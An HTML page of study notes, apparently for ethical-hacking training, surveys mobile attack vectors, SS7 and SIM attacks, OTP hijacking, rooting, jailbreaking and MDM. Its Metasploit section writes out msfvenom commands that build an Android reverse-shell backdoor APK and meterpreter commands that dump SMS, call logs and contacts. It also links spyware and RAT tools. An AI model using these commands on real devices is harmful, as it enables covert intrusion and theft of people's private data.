<html>
    <meta name=”robots” content=”noindex,nofollow”/>
<a href=index.html>Back to home</a>
<hr/>
<h1>Hacking mobile platforms</h1>
<p>People's lifestyles are becoming increasingly reliant on smartphones and tablets. Mobile devices are replacing desktops and laptops and allow users not only to access the internet, email and GPS navigation but also store 
critical data such as contact lists, passwords, calendars and login credentials. People believe that surfing the internet on mobile devices is safe and fail to enable existing security software.</p>

<h2>Mobile platform attack vectors</h2>
<p>Smartphones are being widely used for both business and personal purposes and are a treasure trove for attackers who seek to steal corporate or personal data. The (OWASP) top 10 mobile risks:</p>
  <p><ol>
    <ul>Improper platform usages -> android intents, platform permissions, misuse of touch id, keychain</ul>
    <ul>Insecure data storage -> development teams assume that users and malware will not have access to mobile's file system and store sensitive information in the data stores. Jailbreaking or rooting a mobile
    device bypasses encryption protection mechanisms</ul>
    <ul>Insecure communication -> poor handshaking, incorrect SSL versions, weak negotations, cleartext communication of sensitive assets; admin accounts could expose the entire site, Poor SSL setup can facilitate 
    phishing and MITM attacks</ul>
    <ul>Insecure authentication -> failing to identify the user when required, failure to maintain the user's identity when required, weaknesses in session management</ul>
    <ul>Insufficient cryptography -> cryptography can be attempted but not performed correctly</ul>
    <ul>Insecure authorization -> authorization decisions on the client side and forced browsing, distinct from authentication issues (user identification)</ul>
    <ul>Client code quality -> security decisions via untrusted inputs, catch-all for code level implementation problems in the mobile client (buffer overflows, format string vulnerabilities etc.), results in 
    foreign code execution or DoS on remote server endpoints (not the mobile device itself)</ul>
    <ul>Code tampering -> binary patching, local resource modification, method hooking, method swizzling and dynamic memory modification</ul>
    <ul>Reverse engineering -> analysis of final core binary to determine its source code, libraries, algorithms and other assets</ul>
    <ul>Extraneous functionality -> developers often include hidden backdoor functionality or other internal development security controls that are not intended to be released into a production environment</ul>
  </ol></p>
  <h1>Anatomy of a mobile attack</h1>
  <p>BYOD policies in organizations are the reason for mobile devices to be prime targets for attacks. </p>
  <h2>The Device</h2>
  <p>Device-based attacks are of the following types:</p>
  <p><ol>
    <ul>Browser-based attacks -> phishing, framing (web page integrated into another webpage using iframes etc.), clickjacking (user interface redressing), Man-in-the-Mobile (malicious code that bypasses password 
    verification systems that send OTP (one-time passwords) via SMS or voice calls); Buffer overflows; Data caching</ul>
    <ul>Phone / SMS -based attacks -> Baseband attacks (sending and receiving radio signals); SMiShing</ul>
    <ul>Application-based attacks -> sensitive data storage, no / weak encryption, improper SSL validation, configuration manipulation, dynamic runtime injection (circumvent security locks and logic checks, access 
    privileged parts of an app, steal data stored in memory); Unintended permissions (open doors to attackers via unintended permissions); Escalated privileges</ul>
    <ul>The System -> no passcode / weak passcode, iOS jailbreaking, android routing, OS data caching (memory dumping); passwords and data accessible; carrier-loaded software (pre-installed software or apps may contain 
    vulnerabilities); User-initiated code (trick the victim to install malicious applications or clicking links that allow an attacker to install malicious code to exploit the user's browser, cookies and 
    security permissions</ul>    
  </ol></p>
  <h2>The Network</h2>
  <p><ol>
    <ul>WiFi (weak encryption / no encryption)</ul>
    <ul>Rogue access points </ul>
    <ul>Packet sniffing</ul>
    <ul>MITM</ul>
    <ul>Session Hijacking</ul>
    <ul>DNS Poisoning</ul>
    <ul>SSLStrip (downgrading connections to HTTP which is difficult to detect in mobile browsers)</ul>
    <ul>Fake SSL certificates</ul>
  </ol></p>
  <h2>The Data Center / Cloud</h2>
  <p><ol>
    <ul>Web-server based attacks -> platform vulnerabilities, server misconfigurations, XSS (Cross-site Scripting), CSRF (Cross-site Request Forgery), weak input validation, Brute-force attacks</ul>
    <ul>Database attacks -> SQL Injection, privilege escalation, data dumping, OS command execution (gain unrestricted / root-level system access)</ul>
  </ol></p>
  <h1>Mobile attack vectors and mobile platform vulnerabilities</h1>
<h2>Malicious apps in stores</h2>
<p>In general, apps are made available via application distribution platforms like Apple App Store, Google Play Store, Microsoft Store App, Amazon Appstore, GetJar, APKMirror. App stores are 
common targets for attackers to distribute malware and malicious apps. Attackers may download a legitimate app, repackage it with malware and upload it to a third-party app store where users download it, thinking 
it is genuine.</p>
  <h2>Mobile malware</h2>

  <h2>App sandboxing vulnerabilities</h2>
<p>Developers should develop sandboxed apps. Sandboxing isolates applications from one another but malicious apps may exploit vulnerabilities and bypass the sandbox.</p>
  
  <h2>Weak device and app encryption</h2>

  <h2>OS and app update issues</h2>

  <h2>Jailbreaking and rooting</h2>

  <h2>Mobile application vulnerabilities</h2>

  <h2>Privacy issues (Geolocation)</h2>

  <h2>Weak data security</h2>

  <h2>Excessive permissions</h2>

  <h2>Weak communication security</h2>

  <h2>Physical attacks</h2>

  <h2>Insufficient code obfuscation</h2>

  <h2>Insufficient transport layer security</h2>

  <h2>Insufficient session expiration</h2>

  <h1>Attacks</h1>
  <h2>Mobile Spam</h2>
  <p>Spam messages consume a significant amount of network bandwidth and can lead to financial losse, malware injection and corporate data breach incidents.</p>
  <p>SMS Phising Attack (SMiShing); aka Targeted Attack Scan -> a type of phising fraud in which an attacker uses SMS systems to send bogus texts; goal is to acquire personal and 
  financial information by sending SMS (or IM) containing deceptive links. It is easy to set up and difficult to detect and stop; no mainstream mechanism for weeding out spam SMS and most 
  mobile anti-virus tools do not check SMS</p>
  <h2>Pairing devices on open BT and WiFi</h2>
  <p>Setting a mobile device's BT connection to open or discoverable and turning on automatic WiFi connection capability (particulary in public places) pose significant risks.</p>
  <p><ol>
    <ul>Bluesnarfing -> stealing information via BT (contac list, emails etc.)</ul>
    <ul>Bluebugging -> taking over a device via BT via backdoor attack, allows to sniff sensitive corporate or personal data, receive calls, intercept phone calls etc.</ul>
  </ol></p>
  <h2>Agent Smith Attack</h2>
  <p>Luring victims into downloading and installing malicious apps designed and published by attackers in the form of games, photo editors or other attractive tools from third-party app stores such 
  as 9Apps. The deceptive application replaces legitimate apps such as WhatsApp, SHAREit and MX Player with similar infected versions. Sometimes it appears as authentic Google products such as 
  Google Updater or Themes. The attacker produces a massive volume of irrelevant and fraudulent advertisements on the victim's device through the infected app for financial gain.</p>

  <h2>Exploiting SS7 vulnerability</h2>
  <p>Signaling System 7 (SS7) is a communication protocol that allows mobile users to exchange communication through another cellular network (especially when roaming). Changing the telecom operator 
  or using the network of another cell tower is allowed via the SS7 protocol. Mutual trust between operators, without any authentication verification. The SS7 signaling network is not isolated and the 
  attacker can exploit this vulnerability to perform an MITM attack by impeding text messages and calls between communicating devices. Eavesdropping on bank credentials, OTPs etc. This vulnerability in SS7 
  can allow the attacker to bypass 2FA and end-to-end encryption via SMS</p>

    <h2>Simjacker: SIM card attack</h2>
    <p>Simjacker is a vulnerability associated with a SIM card's S@T browser (SIMalliance Toolbox Browser), a pre-installed software incorporated in SIM cards to provide a set of instructions. 
    The attacker sends fraudulent SMS containing hidden code or instructions from a SIM Application Toolkit (STK). The victim receives the malicious SMS and the S@T browser on the SIM card 
    automatically recognizes and processes the hidden instructions or code. The injected code performs various activities on the device without the user's content. The attacker receives the user 
    information via SMS, who can track live locations, exfiltrate device information, perform many malicious activities.</p>

    <h2>OTP Hijacking / 2FA Hijacking</h2>
    <p>OTPs are sent by a server via SMS, authenticator app or email. This seems secure, but attackers can hijack OTPs and redirect them to their personal devices using different techniques such as 
    social engineering and SMS jacking. The attacker succeeds in OTP hijacking by stealing the victim's data by bribing or tricking mobile store sellers or exploiting the reuse of the number for 
    different customers. Attackers perform social engineering on telecom providers to obtain ownership of the target user's SIM by claiming that their device was lost. In this manner, attackers convince 
    the telecom provider and request them to transfer control over the victim's SIM. Also: SIM jacking attacks can infect the target device's SIM using malware through which the attacker can intercept 
    and read OTPs.</p>

    <h2>OTP Hijacking via Lock screen notifications</h2>
    <p>Attackers physically steal SMS based OTPs from the target user's mobile phone by monitoring the user's actions closely and can view the notifications on the screen when they request an OTP. 
    Eavesdropping or tricking the user into lending their phone for making an emergency call.</p>

    <h2>Camera / Microphone capture attacks</h2>
    <p>Camfecting attack is a webcam capturing attack, the attacker gains access to the camera of a target's computer or mobile device. The attacker infects the target device with a remote access 
    Trojan (RAT) and compromises it to access the victim's camera and microphone. First, the attacker sends a phishing mail with a malicious link or lures the victim into visiting a malicious website.
    When the victim clicks on the malicious link or visits the malicious website, malware is downloaded and installed on the device, providing remote access to the attacker. Now, the attacker can 
    capture personal data such as photos and videos.</p>
    <p>Android Camera Hijack Attack: attackers attempt to leverage Google's camera application, which is widely used in Android devices as the default camera app. An attacker can exploit Android's 
    multiple security bypass vulnerabilities to circumvent the required permissions and gain access to the victim's camera and microphone. Further, the attacker can exploit this vulnerability 
    even if the mobile device is locked. Android camera applications generally require storage permissions to store photos and videos. Permissions as android.permissions.CAMERA, android.permissions.RECORD_AUDIO, 
    android.permissions.ACCESS_COARSE_LOCATION and android.permissions.ACCESS_FINE_LOCATION provide unrestricted access to the entire internal storage and allow attackers to perform various activities 
    such as capturing photos; recording videos and voice calls and accessing stored photos, videos and GPS locations etc.</p>
    <p>Attackers exploit various bypass vulnerabilities on the target Android device by tricking the victim into downloading a malicious app. The malicious app installs a Trojan on the victim's device. When 
    the victim starts using the infected application, a persistent connection is established between victim and attacker.</p>

    <h1>Android Rooting</h1>
    <p>The goal of rooting android is to overcome the restrictions imposed by hardware manufacturers and carriers. It can void the phone's warranty, lead to poor performance, infection by malware and "bricking"
        (making it utterly unusable)</p>

    <h1>Hacking Android Devices</h1>
    <p>Attackers use various tools such as NetCut, drozer, zAnti, Network Spoofer, Low Orbit Ion Cannon (LOIC), Droidsheep, Orbot Proxy etc. to launch attacks on Android devices.</p>
    <p>Attackers use the <a target=_blank href=https://github.com/WithSecureLabs/drozer>drozer</a> tool to discover vulnerabilities and attack surfaces on Android devices and apps.</p>
    <p>Other hacking tools:</p>
    <p><ol>
        <ul><a target=_blank href=https://www.zimperium.com/>zANTI</a> -> spoof MAC address, create malicious WiFi hotspot, scan for open ports, MITM, DoS, insert HTML code into web pages, Hijack sessions etc.</ul>
        <ul><a target=_blank href=https://droidinformer.org>Low Orbit Ion Cannon (LOIC)</a> -> Dos, DDoS attacks on target IP </ul>
        <ul><a target=_blank href=https://droidsheep.info>DroidSheep</a> -> simple Android tool for web session hijacking (sidejacking) using libpcap and arpspoof</ul>
        <ul><a target=_blank href=https://guardianproject.info>Orbot Proxy</a> -> using TOR to encrypt internet traffic, attackers can use it to hide their identity</ul>
        <ul><a target=_blank href=https://github.com/prbhtkumr/PhoneSploit>PhoneSploit</a> -> ADB (Android Debug Bridge) is a command line tool that allows attackers to communicate with the target Android device</ul>
        <ul><a target=_blank href=http://faceniff.ponury.net>FaceNiff</a> -> Android app that allows to sniff and intercept web session profiles over WiFi network</ul>
    </ol></p>
    <h2>Man-in-the-Disk Attack</h2>
    <p>Attackers can perform a MITD attack when applications do not incorporate proper security measures against the usage of the device's external storage. MITD is a variation of MITM. Android consists of two 
    types of storage: internal and external. In general, the internal storage of Android is sandboxed, where the external storage allows file sharing between apps and making it vulnerable to MITD.</p>
    <p><ol>
        <ul>Victim downloads and installs a legitimate app from the official app store</ul>
        <ul>Victim's mobile device receives an app update and requests code update from the cloud server</ul>
        <ul>Victim gives permission to the legitimate app to access external storage</ul>
        <ul>Attacker remotely monitors the external storage and modifies its content by injecting malicious code</ul>
        <ul>Now, the legitimate app fetches and runs the tampered update code from the external storage</ul>
        <ul>The malicious code injected by the attacker automatically requests and installs a fraudulent app from the attacker</ul>
        <ul>Using this malicious app, the attacker can steal the victim's sensitive information stored on the mobile device or completely take control of the mobile phone</ul>
    </ol></p>
    <h2>Spearphone Attack</h2>
    <p>A spearphone attack allows Android apps to record loudspeaker data without any privileges. Attackers can eavesdrop on loudspeaker voice conversations between remote mobile users by exploiting 
    the hardware - based motion sensor (accelerometer). The accelerometer is a firmware chip embedded in most smartphones, and it can be accessed by any app installed on the phone with no special 
    permissions. Attackers can monitor the loudspeaker's output data such as voice assistants, multimedia messages and audio files, using a malicious app to breach speech privacy.</p>

    <h2>Metasploit</h2>
    <p><ol>
        <ul>msf > search type:exploit platform:android</ul>
        <ul>msf > search type:payload platform:android</ul>
        <ul>msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[LOCAL IP ADDRESS] R > Desktop/Backdoor.apk</ul>
        <ul>msf > use exploit/multi/handler</ul>
        <ul>msf > set PAYLOAD android/meterpreter/reverse_tcp</ul>
        <ul>msf > set LHOST [LOCAL IP ADDRESS]</ul>
        <ul>msf > set LPORT [port no.]</ul>
        <ul>msf > exploit</ul>
    </ol></p>
    <p>After receiving a meterpreter prompt, run the sysinfo command. Use the following meterpreter commands to gather sensitive data from the target Android device:</p>
    <p><ol>
        <ul>ipconfig</ul>
        <ul>pwd</ul>
        <ul>ps</ul>
        <ul>dump_sms</ul>
        <ul>dump_calllog</ul>
        <ul>dump_contacts</ul>
        <ul>webcam_list</ul>
    </ol></p>

    <h2>Over-the-Air (OTA) / Advanced SMS Phishing</h2>
    <p>Attackers can use low priced USB modems to trick the victim into accepting new settings (malicious settings) in the mobile device. OTA is easily vulnerable to phishing attacks. Before performing this 
    attack, the attacker requires the victim's IMSI. Using the IMSI, the attacker's malicious message can be easily authenticated and processed in the mobile device. If the IMSI is not available, the 
    attacker sends two messages. The first malicious message contains a PIN that appears to be from the network operator, the second message encompasses the message authenticated with the PIN in the 
    first message</p>
    <h2>Bypass SSL Pinning</h2>
    <p>SSL pinning allows applications to perform operations only after validating trusted certificates and public keys. Using reverse engineering with tools such as Apktool, Frida, Keytool and Jarsigner can 
    bypass SSL pinning.</p>
    <h2>Tap 'n Ghost Attack</h2>
    <p>This attack targets NFC technology and RX electrodes used in capacitive touchscreens of mobile devices.</p>

    <h2>Android Trojans</h2>
    <p><ol>
        <ul>SharkBot</ul>
        <ul>GriftHorse</ul>
        <ul>TeaBot</ul>
        <ul>Android Police Virus</ul>
        <ul>Octo</ul>
        <ul>Aberebot</ul>
        <ul>Xenomorph</ul>
    </ol></p>

    <h1>Android Hacking Tools</h1>
    <p><ol>
        <ul><a target=_blank href=https://github.com/karma9874/AndroRAT>AndroRat</a> -> client / server; full persistent backdoor to target device</ul>
    </ol></p>

    <h1>Online Android Analyzers</h1>
    <p>Online Android analyzers allow you to scan APKs and perform security analysis to detect vulnerabilities in the applications.</p>
    <p><ol>
        <ul><a target=_blank href=https://www.sisik.eu>Sixo Online APK Analyzer</a></ul>
        <ul><a target=_blank href=http://apk-deguard.com>DeGuard</a></ul>
    </ol></p>

    <h1>Hacking iOS</h1>
    <h2>Jailbreaking iOS</h2>
    <p>Jailbreaking is defined as the process of installing a modified set of kernel patches that allow users to run third-party applications not signed by the OS vendor. It is the process of bypassing 
    the user limitations set by Apple, such as modifying the OS, attaining admin privileges and installing unofficially approved apps via 'side loading'. Jailbreaking is accomplished by simply modifying 
    the iOS system kernels. Jailbreaking provides root access to the OS and permits downloading of third-party applications, themes and extensions that are unavailable through the official Apple App Store.</p>

    <h2>Types of Jailbreaking</h2>
    <p><ol>
        <ul>Userland Exploit -> using loophole in the system application; it allows user-level access but does not allow iboot-level access. It's not possible to secure iOS devices against this exploit as 
        nothing can cause a recovery mode loop. Only firmware updates can patch such vulnerabilities.</ul>
        <ul>iBoot Exploit -> this type of exploit can be semi-tethered if the device has a new bootrom; allows user-level access and iboot-level access; take advantage of a loohole in iBoot (iDevice's third
        bootloader) to delink the code-signing appliance. Firmware updates can patch such exploits</ul>
        <ul>Bootrom Exploit -> uses a loophole in the SecureROM (iDevice's first bootloader) to disable signature checks; firmware updates cannot patch such exploits; allows user-level access and iboot-level 
        access; only a hardware update of bootrom by Apple can patch this exploit</ul>
    </ol></p>

    <h2>Jailbreaking techniques</h2>
    <p><ol>
        <ul>Untethered Jailbreaking -> if the user turns the device off and back on, the device will start up completely and the kernel will be patched without the help of a computer; in other words the 
        device will be jailbroken after each reboot</ul>
        <ul>Semi-tethered Jailbreaking -> if turned off and on, the device will start up completely and will no longer have a patched kernel, but will still be usable for normal functions; to use jailbroken 
        addons, the user needs to start the device with the help of the jailbreaking tool</ul>
        <ul>Tethered Jailbreaking -> if the device starts up on its own, it will no longer have a patched kernel and it may get stuck in a partially started state; it essentially must be "re-jailbroken"
        with a computer each time it is turned on</ul>
        <ul>Semi-untethered Jailbreaking -> similar to semi-tethered jailbreak; the kernel can be patched without using a computer, it is patched using an app installed on the device</ul>
    </ol></p>

    <h2>Hacking iOS devices</h2>
    <p><ol>
        <ul><a target=_blank href=https://spyzie.io>Spyzie</a> allows attackers to hack SMS, call logs, app chats, GPS etc. Attackers hack the target device remotely in an invisible mode without jailbreaking 
        the device</ul>
        <ul>iOS Trustjacking -> exploiting the iTunes WiFi Sync whereby the victim connects the device to any trusted computer that is already infected by the attacker</ul>
        <ul>Manipulating an iOS application using <a target=_blank href=http://www.cycript.org>Cycript</a> </ul>
        <ul>iOS method swizzling -> aka Monkey patching, involves modifying the existing methods or adding new functionality at runtime</ul>
        <ul>Extracting secrets using <a target=_blank href=https://github.com/ptoomey3/Keychain-Dumper>Keychain Dumper</a> -> has a self-signed certificate with a wildcard entitlement, to dump secret keychains 
        from the target iOS app</ul>
        <ul>Analyzing an iOS application using <a target=_blank href=https://github.com/sensepost/objection>Objection</a></ul>
    </ol></p>

    <h2>iOS Malware</h2>
    <p><ol>
        <ul>NoReboot Trojan</ul>
        <ul>Pegasus (spyware by an Israel based company that supplies spyware to government agencies)</ul>
    </ol></p>

    <h1>Mobile Device Management</h1>
    <p>MDM is gaining considerable importance with the adoption of BYOD policies etc. MDM provides platforms for over-the-air or wired distribution of applications, data and configuration settings for all
    types of mobile devices. It helps in implementing enterprise-wide policies to reduce support costs, business discontinuity and security risks.</p>
    <p><ol>
        <ul>Uses a passcode for the device</ul>
        <ul>Remotely locks the device if it is lost</ul>
        <ul>Remotely wipes data in the lost or stolen device</ul>
        <ul>Detects if the device is rooted or jailbroken</ul>
        <ul>Enforces policies and tracks inventory</ul>
        <ul>Performs real-time monitoring and reporting</ul>
    </ol></p>

    <h2>BYOD</h2>
    <p>BYOD allows employees to use devices that they are comfortable with and best fits their preference and word purposes. Work anywhere, anytime! </p>
    <p>Benefits:</p>
    <p><ol>
        <ul>Increased productivity</ul>
        <ul>Employee satisfaction</ul>
        <ul>Work flexibility</ul>
        <ul>Lower costs</ul>
    </ol></p>
    <p>Risks:</p>
    <p><ol>
        <ul>Sharing confidential data on unsecured networks</ul>
        <ul>Data leakage and endpoint security issues</ul>
        <ul>Improperly disposing of devices</ul>
        <ul>Support for many different devices</ul>
        <ul>Mixing personal and private data</ul>
        <ul>Lost or stolen devices</ul>
        <ul>Lack of awareness</ul>
        <ul>Ability to bypass organization's network policy rules</ul>
        <ul>Infrastructure issues</ul>
        <ul>Disgruntled employees</ul>
    </ol></p>

    <h1>Reverse engineering mobile applications</h1>
    <p>Reverse engineering is used to:</p>
    <p><ol>
        <ul>Read and understand the source code</ul>
        <ul>Detect underlying vulnerabilities</ul>
        <ul>Scan for sensitive information embedded inside the source code</ul>
        <ul>Conduct malware analysis</ul>
        <ul>Regenerate the application or software after applying some modifications</ul>
    </ol></p>
    <p>Mobile security professionals need to possess basic knowledge or reverse engineering techniques for the following reasons:</p>
    <p><ol>
        <ul>Initiating black-box testing on mobiles apps</ul>
        <ul>Improving static analysis in black-box testing</ul>
        <ul>Performing resilience assessment</ul>
    </ol></p>
    <h2>Reverse Engineering Tools</h2>
    <p><ol>
        <ul><a target=_blank href=https://ibotpeaches.github.io>Apktool</a></ul>
        <ul><a target=_blank href=https://www.frida.re>Frida</a></ul>
    </ol></p>
